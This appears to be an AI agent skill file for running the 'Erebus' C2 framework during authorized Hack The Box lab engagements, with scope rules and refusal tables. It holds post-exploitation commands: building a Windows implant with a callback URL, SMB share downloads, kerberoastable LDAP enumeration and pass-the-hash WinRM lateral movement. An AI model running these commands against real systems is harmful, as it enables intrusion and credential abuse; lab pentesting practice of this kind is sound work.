---
name: erebus-htb
description: >
  Run authorized Hack The Box (HTB) engagements using the Erebus C2 framework
  (teamserver, implant, operator CLI, AI agent). Use when the user mentions
  Erebus on HTB, HTB with C2/implant, soft-compromise path, WinRM PTH via
  Erebus, smb/ldap-enum from implant, or runs /erebus-htb. Scope is HTB labs
  and the user's Erebus repo only — refuse non-authorized real-world targets.
metadata:
  short-description: "Erebus C2 on HTB labs"
---

# /erebus-htb — Erebus C2 for HTB

You help operate and improve **Erebus** during **authorized HTB lab** pentests.
Default repo: `/home/zero/Downloads/Zypheron project/Erebus` (or current workspace if it is Erebus).

## Hard rules (non-negotiable)

1. **Authorized lab only.** HTB machines via HTB VPN, or local labs (GOAD/lab-perf) the user owns. If the target is not clearly HTB/lab, **stop and ask**. Refuse production orgs, random internet hosts, DoS, mass scanning outside HTB scope.
2. **No free-standing malware/exploits for real systems.** HTB exploit guidance is OK in-lab; do not help weaponize against unauthorized targets.
3. **Secrets hygiene:** never put passwords containing `$` in bash double-quotes (`$$` → PID). Write secrets to files (`python3 -c 'open("p","w").write(...)'`). Do not commit `~/htb-*` secrets or `~/.erebus/*.db` into git.
4. **Prefer in-framework tools** when they exist; fall back to external tools (impacket, certipy, pypsrp) only when Erebus lacks the capability — then **log a gap** for the product.
5. **Approvals:** high/critical tasks need operator approve in Erebus; do not bypass the gate in code for "convenience" during eng.

## Load context first

Read as needed (repo-relative):

| Doc | When |
| --- | --- |
| `docs/HTB_NEXT_RUNBOOK.md` | Queue, security checks, next machines |
| `docs/AD_ENGAGEMENT.md` | Soft/golden AD operator paths |
| `docs/GOLDEN_DEMO.md` | AI Auto golden path |
| `CLAUDE.md` / `AGENTS.md` | Build + architecture |
| `reports/htb-*/` | Prior eng notes (Support, Logging) |
| `references/commands.md` (this skill) | Command cheat sheet |

## Session workflow

### 0. Confirm eng parameters

Ask if missing: machine name, target IP, domain (if AD), VPN status, whether implant is already up, objective (user only / full root / framework QA).

### 1. Pre-flight

```bash
# VPN must be up (user runs openvpn)
ip -br a show tun0 2>/dev/null
nmap -Pn -n -p 445,389,88,5985,5986,22,80,443 --open <TARGET_IP>
```

Workdir: `~/htb-<machine>/` with mode `600` secret files.

### 2. Bring up Erebus (if C2 in scope)

```bash
cd "/home/zero/Downloads/Zypheron project/Erebus"
make erebus
# terminal A:
./build/erebus serve   # or: erebus serve
# build implant for target OS; callback must reach teamserver from target
make implant-win CALLBACK_URL=https://<C2_REACHABLE>:443 SLEEP_MS=500 JITTER_PCT=10
# optional C PE: make implant-c  / generate --language c
```

Drop implant after initial shell (WinRM/SSH/etc.) when testing C2. Interactive lab: low sleep OK; kill implant and stop listeners when done.

### 3. Soft-compromise path (preferred AD QA)

After session is alive:

```text
sessions
use <id>
shell whoami
ifconfig
smb list_shares --host <IP> --anon
smb list_dir --host <IP> --share <name> --anon
smb download --host <IP> --share <name> --path <file> [--user u --pass p|--hash h]
ldap-enum interesting --domain DOM --dc DC --user u --pass p
ldap-enum kerberoastable --domain DOM --dc DC --hash <NT>
lateral winrm <host> "whoami /all" --user u --pass p --domain DOM
lateral winrm <host> "whoami" --user u --hash <NT> --domain DOM
pending / approve <id>
loot
```

AI agent: Plan with soft-compromise objective → Auto; do **not** LSASS/RBCD/persist unless objective requires.

### 4. When Erebus cannot do a step

Use external tools, document:

```markdown
## Erebus gaps this eng
| Gap | Workaround | Wanted |
| --- | --- | --- |
```

Known gaps (P1+): ACL enum, RBCD helpers, shadow creds, AES TGT/tickets, DNS write, WSUS MITM (operator infra).

### 5. Report & cleanup

- Write/update `reports/htb-<machine>/PENTEST_REPORT.md` and/or `PROGRESS_AND_FIXES.md`
- Cleanup lab artifacts (machine accounts, RBCD, DNS, local users) if box reused
- Kill implant; stop SOCKS/listeners; `git status` clean of secrets

## Security checks (every eng)

- Scope = assigned HTB IP(s) only  
- No secrets with `$` on bash CLI  
- Kerberos: check clock skew vs DC before TGT  
- Prefer targeted LDAP over full dumps  
- DA-class actions only when root objective needs them  
- End: flags submitted, report updated, implant dead  

## Development mode

If user asks to **fix Erebus** based on eng pain: implement in-repo (modules, catalog, approval, tests). Run:

```bash
go test ./implant/modules/... ./pkg/agent/ ./pkg/suggestions/ ./server/approval/ -count=1
bash scripts/smoke_test.sh
```

Do not expand scope into full MSF replacement unless asked.

## Refuse / redirect

| Request | Action |
| --- | --- |
| Real company without auth | Refuse |
| "Bypass HTB / attack other players" | Refuse |
| Weaponize for non-lab | Refuse |
| HTB without Erebus | Use `/htb-pentest` skill instead |
| Pure framework coding, no HTB | Normal Erebus eng; skip HTB VPN steps |
